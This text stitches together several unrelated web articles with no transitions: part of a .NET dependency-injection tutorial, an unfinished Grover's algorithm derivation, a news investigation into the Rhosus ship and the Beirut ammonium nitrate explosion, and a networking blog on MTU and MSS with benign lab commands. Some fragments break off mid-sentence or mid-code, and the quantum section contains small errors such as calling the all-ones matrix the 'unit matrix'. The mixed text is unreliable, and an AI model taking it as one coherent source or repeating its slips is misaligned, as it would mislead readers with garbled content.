    <span>public</span> <span><span>bool</span></span> IsReadOnly <span>=&gt;</span> <span>false</span><span>;</span>

    <span>public</span> <span>ServiceDescriptor</span> <span>this</span><span>[</span><span><span>int</span></span> index<span>]</span>
    <span>{</span>
        <span>get</span>
        <span>{</span>
            <span>return</span> _descriptors<span>[</span>index<span>]</span><span>;</span>
        <span>}</span>
        <span>set</span>
        <span>{</span>
            _descriptors<span>[</span>index<span>]</span> <span>=</span> <span>value</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>public</span> <span><span>void</span></span> <span>Clear</span><span>(</span><span>)</span> <span>{</span><span>..</span><span>.</span><span>}</span>

    <span>public</span> <span><span>bool</span></span> <span>Contains</span><span>(</span><span>ServiceDescriptor</span> item<span>)</span> <span>{</span><span>..</span><span>.</span><span>}</span>

    <span>public</span> <span><span>bool</span></span> <span>Remove</span><span>(</span><span>ServiceDescriptor</span> item<span>)</span> <span>{</span><span>..</span><span>.</span><span>}</span>

    <span><span>void</span></span> ICollection<span>&lt;</span>ServiceDescriptor<span>&gt;</span><span>.</span><span>Add</span><span>(</span><span>ServiceDescriptor</span> item<span>)</span> <span>{</span><span>..</span><span>}</span>

    
<span>}</span></code></pre></div>
<p>In the subsequent sections, we will look at how it gets utilised.</p>
<p>The <a href="https://docs.microsoft.com/en-us/dotnet/api/microsoft.extensions.dependencyinjection.servicecollectionserviceextensions.addscoped?view=dotnet-plat-ext-3.1"><code>AddScoped</code></a> (and other service registration extension methods) method just adds our service registration (as a ServiceDescriptor) into the above <code>_descriptors</code> list.</p>
<p>Looking at <a href="https://github.com/dotnet/runtime/blob/60eff3f3766631bd4e7ee256ca17619fec90e9e6/src/libraries/Microsoft.Extensions.DependencyInjection/src/ServiceCollectionContainerBuilderExtensions.cs#L49">the internals</a> of the <code>BuildServiceProvider</code> extension method, we can see that it actually instantiates a new service provider with our given service registrations. As we saw earlier these service registrations are passed in as a <code>ServiceCollection</code> and if you put debug this, you will be able to see the following: </p>

<p>If you are interested, one observation I made was to get an idea of <em>when</em> it actually instantiates our types. In our Program.cs if you update it as below,</p>
<div data-language="csharp"><pre><code><span><span>var</span></span> provider <span>=</span> container<span>.</span><span>BuildServiceProvider</span><span>(</span><span>)</span><span>;</span>
Console<span>.</span><span>WriteLine</span><span>(</span><span>"-----------"</span><span>)</span><span>;</span>

<p>Should give you,</p>

<p>See the dotted line before “Doing some work in MyDependency”? I initially thought that these types would have been constructed when we built the service provider. However, it seems that they are instantiated when we call <code>provider.GetService&lt;MyService&gt;();</code> instead. This should, however, not to be confused with service lifetimes in an ASP.NET Core web application where service lifetimes play a major role in the request pipeline.</p>
<blockquote>
<p>💡 The IoC container will instantiate our implementation types when the GetService<t>() method is called, not when the IoC container is built.</t></p>
</blockquote>
<p>Looking at the implementation of the <code>ServiceProviderEngine</code>’s code you will see that the data structure that holds all our type registrations is really a <code>ConcurrentDictionary</code>. If you drill down in the call chain of <code>GetService</code> far enough, you would come across the following class in the <a href="https://github.com/dotnet/runtime/blob/907f7da59b40c80941b02ac2a46650adf3f606bc/src/libraries/Microsoft.Extensions.DependencyInjection/src/ServiceLookup/CallSiteValidator.cs#L14">source of DI extensions</a>.</p>
<p>So, we have an idea of how we can register services in the IoC container. Nevertheless, this can still be improved by mapping interfaces rather than using concrete classes. We will look at it in the next section.</p>
<h3>Replacing Concrete Classes with Interfaces</h3>
<p>Let’s extract interfaces for <code>MyService</code> and <code>MyDependency</code></p>
<div data-language="csharp"><pre><code><span>public</span> <span>interface</span> <span>IMyService</span>
<span>{</span>
    <span><span>void</span></span> <span>DoSomething</span><span>(</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<div data-language="csharp"><pre><code><span>public</span> <span>interface</span> <span>IMyDependency</span>
<span>{</span>
    <span><span>void</span></span> <span>DoWork</span><span>(</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>Nothing interesting here. Let’s just implement these two interfaces in their corresponding classes. </p>
<p>Our <code>MyService</code> will now use the interface instead of the concrete class.</p>
<div data-language="csharp"><pre><code><span>public</span> <span>class</span> <span>MyService</span> <span>:</span> <span><span>IMyService</span></span>
<span>{</span>
    <span>private</span> <span>readonly</span> <span>IMyDependency</span> _myDependency<span>;</span>
    
    <span>public</span> <span>MyService</span><span>(</span><span>IMyDependency</span> myDependency<span>)</span>
    <span>{</span>
        Console<span>.</span><span>WriteLine</span><span>(</span><span>"Constructed MyService"</span><span>)</span><span>;</span>
        _myDependency <span>=</span> myDependency<span>;</span>
    <span>}</span>
    
    <span>public</span> <span><span>void</span></span> <span>DoSomething</span><span>(</span><span>)</span>
    <span>{</span>
        _myDependency<span>.</span><span>DoWork</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span></code></pre></div>
<p>In our Program.cs, we will update the following lines to use the abstractions instead of concrete classes,</p>
<div data-language="csharp"><pre><code>container<span>.</span><span><span>AddScoped</span><span><span>&lt;</span>IMyDependency<span>,</span> MyDependency<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span>
container<span>.</span><span><span>AddScoped</span><span><span>&lt;</span>IMyService<span>,</span> MyService<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span></code></pre></div>
<p>Now when we run the application, we will get the same result. However, to make things interesting, let’s add another <code>MyDependency</code> class that implements <code>IMyDependency</code> interface. Without spending too much time on a name, let’s name that <code>MyDependency2</code> and register it in the IoC container.</p>
<div data-language="csharp"><pre><code>container<span>.</span><span><span>AddScoped</span><span><span>&lt;</span>IMyDependency<span>,</span> MyDependency<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span>
container<span>.</span><span><span>AddScoped</span><span><span>&lt;</span>IMyDependency<span>,</span> MyDependency2<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span> 
container<span>.</span><span><span>AddScoped</span><span><span>&lt;</span>IMyService<span>,</span> MyService<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span></code></pre></div>
<p>What do we get now?</p>
<p><span>
      <span></span>
  <img alt="dotnet-core-ioc-container-6.png" title="dotnet-core-ioc-container-6.png" src="https://sahansera.dev/static/054d62c81104ef8c756fefbacd9cee15/5a190/dotnet-core-ioc-container-6.png" srcset="https://sahansera.dev/static/054d62c81104ef8c756fefbacd9cee15/772e8/dotnet-core-ioc-container-6.png 200w,

    </span></p>
<p>It’s no longer using <code>MyDependency</code>, but using <code>MyDependency2</code> instead.</p>
<blockquote>
<p>💡 Remember, if you add multiple concrete implementations for the same interface, it will always pick up the last one that got registered, by default.</p>
</blockquote>
<h3>Unravelling why we get the last registered implementation type</h3>
<p>So, how do we register multiple implementations for the same service type? It’s not supported as you might already know or have come across this <a href="https://github.com/aspnet/DependencyInjection/issues/360">discussion on Github</a>. Looking at the internals of the <code>GetService()</code> method we can uncover why this happens.</p>
<p>If you debug the <code>ServiceCollection</code>, you will be able to see that our two implementation types for <code>IMyDependency</code> are still there.</p>

<p>So there has to be something in the call stack which hands over the last registered implementation type to the service provider.

      <h3 id="introduction">Introduction</h3>

<p>Grover’s algorithm is a quantum computing algorithm invented to search from <strong>unstructured</strong> database using less than $O(\sqrt{N})$ queries. Comparing to $O(N)$ which is the best asymptotical complexity that a classical search algorithm could achieve for unstructured database, Grover’s algorithm is significantly better.</p>



<p>In this blog post, I would like to discuss Grover’s algorithm and its caveats in details.</p>

<h3 id="prerequisites">Prerequisites</h3>

<p>From the <a href="https://leimao.github.io/blog/Simon-Algorithm/">property of Hadamard operator</a>, we have already known that</p><p>

\[\begin{align}
H^{\otimes {n}} | \mathbf{0} \rangle &amp;= \frac{1}{\sqrt{2^n}} \sum_{ \mathbf{x} \in \{0,1\}^n } | \mathbf{x} \rangle \\
\end{align}\]

</p><p>We denote it using $| \mathbf{s} \rangle$ for our convenience.</p><p>

\[\begin{align}
| \mathbf{s} \rangle &amp;= H^{\otimes {n}} | \mathbf{0} \rangle \\
&amp;= \frac{1}{\sqrt{2^n}} \sum_{ \mathbf{x} \in \{0,1\}^n } | \mathbf{x} \rangle \\
\end{align}\]

</p><p>The following equation would be useful for this article.</p><p>

\[\begin{align}
2 | \mathbf{s} \rangle \langle \mathbf{s} | - I &amp;= 2 \Big( H^{\otimes {n}} | \mathbf{0} \rangle \Big) \otimes_{\text{outer}} \Big( H^{\otimes {n}} | \mathbf{0} \rangle \Big) - I \\
&amp;= 2 \Big( H^{\otimes {n}} | \mathbf{0} \rangle \Big) \Big( H^{\otimes {n}} | \mathbf{0} \rangle \Big)^{\dagger} - I \\
&amp;= 2 H^{\otimes {n}} | \mathbf{0} \rangle | \mathbf{0} \rangle^{\dagger}  H^{\otimes {n} \dagger} - I \\
&amp;= 2 H^{\otimes {n}} \big(| \mathbf{0} \rangle \langle \mathbf{0} |\big)  H^{\otimes {n}} - I \\
&amp;= 2 H^{\otimes {n}} \big(| \mathbf{0} \rangle \langle \mathbf{0} |\big)  H^{\otimes {n}} - H^{\otimes {n}} I H^{\otimes {n}} \\
&amp;= H^{\otimes {n}} \big(2 | \mathbf{0} \rangle \langle \mathbf{0} | - I \big) H^{\otimes {n}} \\
\end{align}\]

</p><p>where $| \mathbf{s} \rangle \langle \mathbf{s} |$ is the outer product of $| \mathbf{s} \rangle$ and $| \mathbf{s} \rangle$ and the $\otimes_{\text{outer}}$ is the outer product. Note that outer product $\otimes_{\text{outer}}$ is a little bit different from Kronecker product which we have used $\otimes$ to denote in the previous articles.</p>



<p>Let’s check what $| \mathbf{s} \rangle \langle \mathbf{s} |$ is.</p><p>

\[\begin{align}
| \mathbf{s} \rangle \langle \mathbf{s} | &amp;= \bigg( \frac{1}{\sqrt{2^n}} \sum_{ \mathbf{x} \in \{0,1\}^n } | \mathbf{x} \rangle \bigg) \otimes_{\text{outer}} \bigg( \frac{1}{\sqrt{2^n}} \sum_{ \mathbf{x} \in \{0,1\}^n } | \mathbf{x} \rangle \bigg) \\
&amp;= \frac{1}{2^n} \sum_{ \mathbf{x} \in \{0,1\}^n } \sum_{ \mathbf{y} \in \{0,1\}^n } | \mathbf{x} \rangle \otimes_{\text{outer}} | \mathbf{y} \rangle \\
&amp;= \frac{1}{2^n} \sum_{ \mathbf{x} \in \{0,1\}^n } \sum_{ \mathbf{y} \in \{0,1\}^n } | \mathbf{x} \rangle \langle \mathbf{y} | \\
&amp;= \frac{1}{2^n} 
\begin{bmatrix} 
    1 &amp; 1 &amp; \cdots &amp; 1 \\
    1 &amp; 1 &amp; \cdots &amp; 1 \\
    \vdots &amp; \vdots &amp; \vdots &amp; \vdots \\
    1 &amp; 1 &amp; \cdots &amp; 1 \\
\end{bmatrix}_{2^n \times 2^n} \\
&amp;= \frac{1}{2^n} J_{2^n \times 2^n} \\
\end{align}\]

</p><p>where $J$ is the unit matrix.</p>



<p>We further define matrix $A$</p><p>

\[\begin{align}
A &amp;= | \mathbf{s} \rangle \langle \mathbf{s} | \\
&amp;= \frac{1}{2^n} J_{2^n \times 2^n} \\
\end{align}\]

</p><p>We would like to further show that matrix $2A - I$ is unitary.</p>



<p>It is trivial to see that $A^{\dagger} = A$, therefore, $(2A - I)^{\dagger} = 2A - I$. Because</p><p>

\[\begin{align}
(2A - I)^{\dagger} (2A - I) &amp;= (2A - I) (2A - I)^{\dagger} \\
&amp;= (2A - I)^2 \\
&amp;= 4A^2 - 4A + I \\
&amp;= \frac{4}{2^{2n}} 2^n J_{2^n \times 2^n} - \frac{4}{2^n} J_{2^n \times 2^n} + I \\
&amp;= 0 + I \\
&amp;= I \\
\end{align}\]

</p><p>This concludes the proof that $2A - I$ is unitary.</p>



<p>In addition, $2A - I$ is actually an reflection matrix that could reflect the vector $| \mathbf{x} \rangle$ about $| \mathbf{s} \rangle$.</p><p>

\[\begin{align}
| \mathbf{x}^{\prime} \rangle&amp;= (2A - I) | \mathbf{x} \rangle \\
&amp;= (2 | \mathbf{s} \rangle \langle \mathbf{s} | - I) | \mathbf{x} \rangle \\
&amp;= 2 | \mathbf{s} \rangle \langle \mathbf{s} | | \mathbf{x} \rangle - | \mathbf{x} \rangle \\
&amp;= 2 | \mathbf{s} \rangle ( \langle \mathbf{s} | | \mathbf{x} \rangle ) - | \mathbf{x} \rangle \\
&amp;= 2 | \mathbf{s} \rangle \langle \mathbf{s}, \mathbf{x} \rangle - | \mathbf{x} \rangle \\
&amp;= 2 \langle \mathbf{s}, \mathbf{x} \rangle | \mathbf{s} \rangle - | \mathbf{x} \rangle \\
\end{align}\]

</p><p>Typically, given a normalized unit vector $\mathbf{n}$, and a vector $\mathbf{x}$, the reflected vector of vector $\mathbf{x}$ about $\mathbf{n}$ is</p><p>

\[\mathbf{x}^{\prime} = 2 \langle \mathbf{n}, \mathbf{x} \rangle \mathbf{n} - \mathbf{x}\]

</p><p>This is high-school math. If the reader forgot how to understand this, please refer to the blog post <a href="http://paulbourke.net/geometry/reflected/">“Calculating the Reflected Ray”</a>.</p>



<p>This concludes the proof that $2A - I$ is a reflection matrix about $| \mathbf{s} \rangle$.</p>

<h3 id="identity-search-problem">Identity Search Problem</h3>

<p>Suppose we have an array of items $\{v_0, v_1, \cdots, v_{n-1}\}$, and we would like to find a target item $v_g$ to find from the array. Using a classical algorithm, we have to go through the entire array, that is we retrieve items one by one from the array and compare them against the target item. The asymptotic complexity for the worst case and the average case are both $O(n)$.</p>



<p>It seems that $O(n)$ is the best we could do for a search problem using a classical algorithm. How could we know where is target item is in the array without going through the entire array? However, using a quantum algorithm, we would be able to complete a search in $O(\sqrt{n})$. In the next sections, we would see how we could achieve this.</p>



<p>Suppose all the items are distinct and there is only one item matching the query, the search problem could be modeled using a given function $f: \{0,1\}^n \rightarrow \{0,1\}$, and we are assured that there exits exactly one binary string $\mathbf{x}^\ast$, such that</p><p>

\[\begin{align}
f(\mathbf{x}) &amp;= 
    \begin{cases}
      1 &amp; \text{when $\mathbf{x} = \mathbf{x}^\ast$}\\
      0 &amp; \text{when $\mathbf{x} \neq \mathbf{x}^\ast$}\\
    \end{cases} 
\end{align}\]

</p><p>The search problem is converted to find $\mathbf{x}^\ast$.</p>

<h3 id="grovers-algorithm">Grover’s Algorithm</h3>

<h4 id="quantum-oracle-circuit">Quantum Oracle Circuit</h4>

<p>The following quantum oracle circuit is used for phase inversion in the Grover’s algorithm.</p>

<div>
<figure>
    <img src="https://leimao.github.io/images/blog/2020-08-22-Grover-Algorithm/oracle.png">
    <figcaption>Quantum Oracle Circuit</figcaption>
</figure>
</div>

<p>This quantum oracle circuit has been well discussed in my previous article on <a href="https://leimao.github.io/blog/Deutsch-Jozsa-Algorithm/">Deutsch-Jozsa algorithm</a>. We have known that</p><p>

\[\begin{align}
|\varphi_2\rangle &amp;= (-1)^{f(\mathbf{x})} |\mathbf{x}\rangle \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \\
\end{align}\]

</p><p>If the top input qubits to $U_f$ is an equal superposition, i.e.,</p><p>

\[\begin{align}
| \mathbf{s} \rangle &amp;= H^{\otimes {n}} | \mathbf{0} \rangle \\
&amp;= \frac{1}{\sqrt{2^n}} \sum_{ \mathbf{x} \in \{0,1\}^n } | \mathbf{x} \rangle \\
\end{align}\]

</p><p>what will the top output qubits be?</p>



<p>Because we have assumed that there is only one $\mathbf{x} = \mathbf{x}^\ast$, such that $f(\mathbf{x}) = 1$, and for $\mathbf{x} \neq \mathbf{x}^\ast$ we have $f(\mathbf{x}) = 0$,</p><p>

\[\begin{align}
|\varphi_2\rangle &amp;= \frac{1}{\sqrt{2^n}} \Bigg( \sum_{\mathbf{x} \neq \mathbf{x}^\ast}^{} (-1)^{0} |\mathbf{x}\rangle \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \Bigg) + \frac{1}{\sqrt{2^n}} (-1)^{1} |\mathbf{x}^\ast \rangle \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \\
&amp;= \frac{1}{\sqrt{2^n}} \Bigg( \sum_{\mathbf{x} \neq \mathbf{x}^\ast}^{} |\mathbf{x}\rangle \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \Bigg) - \frac{1}{\sqrt{2^n}} |\mathbf{x}^\ast \rangle \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \\
&amp;= \Bigg( \sum_{\mathbf{x} \neq \mathbf{x}^\ast}^{} \frac{1}{\sqrt{2^n}} |\mathbf{x}\rangle - \frac{1}{\sqrt{2^n}} |\mathbf{x}^\ast \rangle \Bigg) \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \\
\end{align}\]

</p><p>This means that for the top output qubits, although we have equal probability to observe each of the base qubit states, the phase amplitude of the base qubit $|\mathbf{x}^\ast \rangle$ is different from all the others! That is also to say, the phase of the top input qubits is 
$\big[ \frac{1}{\sqrt{2^n}}, \frac{1}{\sqrt{2^n}}, \cdots, \frac{1}{\sqrt{2^n}} \big]$, but the phase of the output qubits becomes $\big[ \frac{1}{\sqrt{2^n}}, \cdots, \frac{1}{\sqrt{2^n}}, -\frac{1}{\sqrt{2^n}}, \frac{1}{\sqrt{2^n}},\cdots, \frac{1}{\sqrt{2^n}} \big]$.</p>

<h4 id="phase-diffusion-circuit">Phase Diffusion Circuit</h4>

<p>Now, in order to find $| \mathbf{x}^\ast \rangle$, the strategy becomes straightforward. We just have to find out the base qubits state whose phase amplitude is different from others. The question is, how to find it?</p>



<p>Let’s do some dummy trials. If we send the top output qubits to another identical quantum oracle circuit, the phase will go back to $\big[ \frac{1}{\sqrt{2^n}}, \frac{1}{\sqrt{2^n}}, \cdots, \frac{1}{\sqrt{2^n}} \big]$. The readers could verify this on you own. This means we have gone back to the origin. We should probably do something differently.</p>



<p>What Grover found was actually very smart. The average of the phase amplitudes $\big[ \frac{1}{\sqrt{2^n}}, \cdots, \frac{1}{\sqrt{2^n}}, -\frac{1}{\sqrt{2^n}}, \frac{1}{\sqrt{2^n}},\cdots, \frac{1}{\sqrt{2^n}} \big]$ is a value only a little bit smaller than $\frac{1}{\sqrt{2^n}}$, because the majority of the phase amplitudes are $\frac{1}{\sqrt{2^n}}$, and only one phase amplitude corresponding to $|\mathbf{x}^\ast \rangle$, which we denote as $\alpha_{\mathbf{x}^{\ast}}$, is $-\frac{1}{\sqrt{2^n}}$. If we could <em>inverse the phase amplitude about the mean</em>, the absolute value of $\alpha_{\mathbf{x}^{\ast}}$ will become the largest among all the phase amplitudes.</p>



<p>Specifically, at time step $t$, suppose the phase amplitude for each base qubits state $|\mathbf{x} \rangle$ is $\alpha_{\mathbf{x}, t}$. The average of the phase amplitudes $\mu_t$ is</p><p>

\[\mu_t = \frac{1}{2^n} \sum_{\mathbf{x} \in \{0,1\}^n}^{} \alpha_{\mathbf{x}, t}\]

</p><p>After the <em>inversion about the mean</em>, the phase amplitudes would become</p><p>

\[\begin{align}
\alpha_{\mathbf{x}, t}^{\prime} &amp;= (\mu_t - \alpha_{\mathbf{x}, t}) + \mu_t \\
&amp;= 2\mu_t - \alpha_{\mathbf{x}, t} \\
\end{align}\]

</p><p>To do this in a matrix …</p></div></div>

<p>In September 2013, eight Ukrainians and a Russian departed Georgia on a beat-up freighter, apparently heading for Mozambique. Their ship was already in bad shape before it even left the Black Sea port of Batumi. Called the <em>Rhosus, </em>the vessel was leaking, its alarm system was faulty and so was its rescue equipment.</p>


<div>
<p>But the cargo on board was extremely volatile: 2,750 tons of ammonium nitrate in a highly concentrated variant, the kind used to make explosives, with a nitrogen enrichment level of almost 35 percent. Seven years later, on August 4, 2020, it would devastate parts of Lebanon's capital city Beirut, killing around 200 people and injuring thousands.</p><p>Since then, the world has taken an interest in the <em>Rhosus</em> and its history, with investigators trying to piece together the details of its final voyage. How did the <em>Rhosus</em> end up in Beirut? And who had really ordered the explosive chemicals?</p><p>Thus far, the story has been that the ship belonged to a Russian man named Igor Grechushkin. The cargo was reportedly destined for a company called Fábrica de Explosivos de Moçambique, or FEM for short, a Mozambican explosives manufacturer.</p>
</div>

<p>But joint reporting conducted by DER SPIEGEL and the journalism network called the Organized Crime and Corruption Reporting Project (OCCRP) has now raised doubts about that narrative. The reporting has found that it was not Russian national Grechushkin who owned the <em>Rhosus</em>, but rather the Cypriot businessman Charalambos Manoli, who maintained a relationship with the bank used by Hezbollah in Lebanon. And a considerable amount of the ammonium nitrate stored in the port of Beirut appears to have gone missing before the explosion in August.</p>

<p>Did the crew of the <em>Rhosus </em>ever even intend to sail the ship to Mozambique? Is it possible that its explosive cargo was actually destined for Hezbollah, the Islamist party and militia that operates in Lebanon as a state within a state and is involved in wars from Syria to Iraq?</p>

<div>
<h3>Efforts to Conceal Ownership</h3><p>In any case, Manoli made every effort to conceal the ownership of the <em>Rhosus</em>. One of his companies arranged to have the <em>Rhosus </em>registered in Moldova. Another company, Maritime Lloyd in Georgia, certified the seaworthiness of the ailing freighter. Ultimately, Russian national Grechushkin only chartered the ship through his company Teto Shipping, which is registered in the Marshall Islands.</p><p>When questioned by OCCRP, Manoli initially claimed that the vessel had been sold to Grechushkin, only to then concede that the Russian had only made an attempt to buy the ship. He then refused to provide any further information.</p>
</div>

<div>
<p>Grechushkin did, in fact, give the orders to the crew on the <em>Rhosus.</em> He also gave the order that the <em>Rhosus</em> was to make an unscheduled stop in Beirut on its way from Georgia to Mozambique. The official reason sounds dubious: Grechushkin claimed that he didn’t have enough money to pay for the <em>Rhosus</em>’ passage through the Suez Canal. Which is why it needed to pick up additional cargo in Beirut to be delivered to Jordan. The freight consisted of "12 large trucks, 15 small ones, one 40-foot container and two 20-foot containers," states a report by the Lebanese Transportation Ministry.</p><p>The fleet of vehicles was to be stowed on the deck of the <em>Rhosus.</em> But the problems began during the loading of the very first vehicle, which rammed a door as they tried to maneuver it onto the deck. The loading procedure was aborted as a consequence.</p><p>Ultimately, the <em>Rhosus</em> never left Beirut. At least two companies that Manoli owed money to had the freighter seized, including one that rented generators, from which Manoli had previously rented a generator for the ship. The Beirut Port Authority also found that the <em>Rhosus</em> was not&nbsp;seaworthy.</p>

<p>The Lebanese authorities apparently didn’t know that Manoli was the true owner of the <em>Rhosus.</em> In any case, his name doesn’t appear in any of the correspondence, which was voluminous.</p><p>In contrast to Grechushkin, the Russian who chartered the vessel, Manoli did have business relations in Lebanon. Court records show that Manoli took out a loan back in 2011 for $4 million from the Tanzanian FBME Bank to finance the purchase of another ship, the <em>Sakhalin</em>.</p><p>FBME isn’t just any bank. American investigators have accused the institution of acting as a money launderer for Hezbollah. Another of the bank’s customers was a suspected Syrian front company that had been involved in the country’s chemical weapons program. It was to this bank that Manoli owed money.</p><h3>Seized Holdings</h3><p>Only one month after he received the loan, Manoli’s company Seaforce Marine Limited, based in Belize in Central America, defaulted on the first installment. Manoli had offered the <em>Rhosus</em> as collateral, but FBME suspected that the shipowner wanted to sell the vessel and seized Manoli’s real estate holdings in Cyprus.</p><p>Internal FBME documents show that Manoli still owed the bank 962,000 euros in outstanding debt in October 2014. Manoli denies any connection between his debts and the fact that the freighter was stopped in Beirut. However, one investigator notes that FBME is notorious for pressuring defaulting borrowers into doing favors for dubious customers like Hezbollah.</p><p>The official buyer of the ammonium nitrate, FEM in Mozambique, was also a subject of investigations. Spanish authorities conducted an investigation into the company Moura Silva e Filhos, which holds 95-percent ownership of FEM, in connection with the Islamist terrorist attacks in Madrid in 2004. Even though they didn’t ultimately obtain a conviction for aiding terrorists, investigators determined that 785 kilograms of explosives were not listed in the company’s books.</p>

<p>Moura Silva e Filhos clearly isn’t squeamish when it comes to choosing his business partners. American arms smuggling expert Kathi Lynn Austin says the company maintains close contacts with the ruling clique in Mozambique, among others.</p><p>However, FEM never claimed the 2,750 tons of ammonium nitrate that was stranded in Beirut on the <em>Rhosus</em>, even though the chemicals were at no point officially confiscated by the Lebanese authorities.</p><p>In 2015, the broker for the ammonium nitrate had a lawyer request that the Lebanese authorities inspect the quality and quantity of the cargo. Oddly, though, the court records do not show any attempt by the broker to recover the cargo, which had an original value of $700,000.</p><p>Manoli likewise didn’t make any efforts to reclaim his ship, which eventually sank outside the port in February 2018. Purported <em>Rhosus</em> owner Grechushkin could not be reached for comment.</p><h3>Abandoned</h3><p>Ultimately, the ammonium nitrate was an abandoned freight: No one admitted to having paid for it and no one tried to recover it.</p><p>In the end, the highly explosive chemicals were stored for six years in Hall 12 at the Port of Beirut. The authorities, particularly customs officials, warned repeatedly that the ammonium nitrate needed to be removed from the port. But the petitions were sent to the wrong court so persistently that it is difficult for lawyers involved to believe in mere incompetence. Is it possible that the intent was for the ammonium nitrate to remain in Hall 12?</p><p>Another inspection of the cargo in spring 2020, this time by the Lebanese state security, raised doubts as to whether all 2,750 tons of the ammonium nitrate were still there. One of the warehouse’s gates was missing and there was a large hole in the south wall, they warned. "If a theft were to occur, the perpetrators could use these goods as explosives." But the state security officials apparently didn’t count or measure the exact amount of ammonium nitrate that was still left in the warehouse at the time.</p><p>Their warning that the warehouse needed to be secured didn’t reach Lebanon’s prosecutor general until June. In mid-July, state security also sent the report to the president and the prime minister. But no action was taken.</p><p>It’s still unclear today how much ammonium nitrate was detonated in the August 4 explosion. European intelligence officials involved in the investigation assume it was between 700 and 1,000 tons.</p><p>But where did the rest, the much larger quantity of the explosive chemicals, go? That’s one of the many questions investigators will now need to answer.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p>MTU and MSS are two terms that are easily mistaken and their misconfiguration is often the cause of networking problems. Spending enough time working on production systems that interface with large networks of computers or the Internet almost guarantees coming across situations where an interface was configured with the wrong MTU, or a firewall was filtering ICMP. This results in a client being unable to transfer large amounts of data when smaller transfers work fine. This post will walk through MTU, MSS and packet size negotiation for TCP connections, and the common situations where it breaks down. This post was inspired by multiple discussions during the course of investigating errors on production systems as part of my role at GitHub.</p>

<p>If you want to take away a simple snippet from this post, the summary is:</p>

<p>
The MTU of the interfaces on either side of a physical<br>
or logical link must be equal. Don't block ICMP.
</p>

<p>The examples mentioned in this blog post will be reproducible in the lab from <i></i> <a href="https://github.com/theojulienne/blog-lab-mtu">theojulienne/blog-lab-mtu</a> - clone this repository and <a href="https://www.vagrantup.com/">bring up the lab</a>, then poke around at these examples in a real system:</p>
<div><div><pre><code>$ git clone https://github.com/theojulienne/blog-lab-mtu.git
$ cd blog-lab-mtu
$ vagrant up
$ vagrant ssh
</code></pre></div></div>

<h2 id="ethernet-mtu-maximum-transmission-unit">Ethernet MTU: Maximum Transmission Unit</h2>

<p>The MTU (Maximum Transmission Unit) on an Ethernet network specifies the maximum payload size of the data to be transmitted along with an Ethernet header on a network. Typically this payload will be an IP packet, in which case the MTU specifies the maximum combined size of the IP header and IP data.</p>

<p><img alt="Ethernet / IP / TCP headers with MTU indicated" src="https://theojulienne.io/images/mtu-mss-why-connections-stall/mtu-packet.png">
</p>

<p>The MTU is specified at the interface level as it is a link-level setting, and is typically propagated down to the underlying network card driver. The expectation is that packets that are larger than this configured size that appear to be transmitted over the wire are invalid or corrupt and should be dropped. In a valid configuration, hosts connected together via a link will have the same MTU specified:</p>

<p>If interfaces on either side of a link have mismatching MTU configurations, then the smaller side will treat packets larger than the local MTU as invalid and drop the packets before any software has the chance to see them.</p>

<p><img alt="Client and server connected with mismatching MTU" src="https://theojulienne.io/images/mtu-mss-why-connections-stall/simple-2-computers-mismatch.png">
</p>

<p>Streams of data that are larger than the MTU will be broken up into packets that completely fill an Ethernet frame, up to the MTU in each. If the remote end has a smaller MTU configured for the same link, those larger packets will be dropped. MTU should be configured the same on both interfaces on either side of a link, and so the MTU should be considered a bidirectional maximum.</p>

<h3 id="mtu-in-the-lab">MTU in the lab</h3>

<p>The lab in this blog post can be used to observe this in an example system. In one terminal, bring up the lab hosts inside the Vagrant machine:</p>
<div><div><pre><code>$ vagrant ssh -- /vagrant/bin/run-lab
</code></pre></div></div>

<p>In another terminal, <code>vagrant ssh</code> then enable the first scenario from above with matching MTU of 1500 on client and server:</p>
<div><div><pre><code>vagrant@blog-lab-mtu:/vagrant$ /vagrant/bin/scenario direct_1500
</code></pre></div></div>

<p>Log in to the client and server hosts and observe that we can send a packet with 1400 bytes of payload as expected, since both hosts have an MTU of 1500. The <code>-s 1400</code> argument to <code>ping</code> sets the payload size, and the <code>-M do</code> argument instructs <code>ping</code> to set the <code>DF</code> (Don’t Fragment) bit, ensuring that the whole IP packet must arrive in one piece or not at all.</p>
<div><div><pre><code>vagrant@blog-lab-mtu:/vagrant$ /vagrant/bin/shell client
root@client:/# ping -c 2 -M do -s 1400 server-direct
PING server-direct (172.28.0.40) 1400(1428) bytes of data.

--- server-direct ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 2ms

vagrant@blog-lab-mtu:/vagrant$ /vagrant/bin/shell server
root@server:/# ping -c 2 -M do -s 1400 client-direct
PING client-direct (172.28.0.10) 1400(1428) bytes of data.
1408 bytes from client-direct (172.28.0.10): icmp_seq=1 ttl=64 time=0.079 ms
1408 bytes from client-direct (172.28.0.10): icmp_seq=2 ttl=64 time=0.071 ms

rtt min/avg/max/mdev = 0.071/0.075/0.079/0.004 ms
root@server:/# 
</code></pre></div></div>

<p>Now switch to the second scenario with mismatching MTU, and observe that 1400 byte payloads no longer succeed:</p>
<div><div><pre><code>vagrant@blog-lab-mtu:/vagrant$ /vagrant/bin/scenario direct_mismatch

vagrant@blog-lab-mtu:/vagrant$ /vagrant/bin/shell client
root@client:/# ping -c 2 -M do -s 1400 server-direct
PING server-direct (172.28.0.40) 1400(1428) bytes of data.
ping: local error: Message too long, mtu=1200
ping: local error: Message too long, mtu=1200

--- server-direct ping statistics ---
2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 10ms

root@client:/# exit
vagrant@blog-lab-mtu:/vagrant$ /vagrant/bin/shell server
root@server:/# ping -c 2 -M do -s 1400 client-direct
PING client-direct (172.28.0.10) 1400(1428) bytes of data.

